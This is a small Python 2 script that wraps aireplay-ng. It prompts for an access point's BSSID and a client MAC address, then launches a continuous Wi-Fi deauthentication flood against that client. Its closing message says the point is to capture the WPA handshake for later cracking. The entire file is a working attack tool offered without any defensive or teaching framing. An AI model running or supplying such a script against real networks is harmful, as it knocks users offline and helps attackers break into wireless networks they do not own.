#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
# from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

def main():
    BSSID_cmt = str(raw_input("Enter the BSSID of the ACCESS POINT: "))
    CLIENT_cmt = str(raw_input("Enter the CLIENT MAC address connected to AP: "))

    cmd_String = "aireplay-ng -0 0 -c %s -a %s --ignore-negative-one wlan1mon" % (
        CLIENT_cmt,
        BSSID_cmt
    )
    print cmd_String
    os.system(cmd_String)
    print 'Deauth attack run complete, check Airodump-ng for any packets containing the WPA handshake'
    return

main()
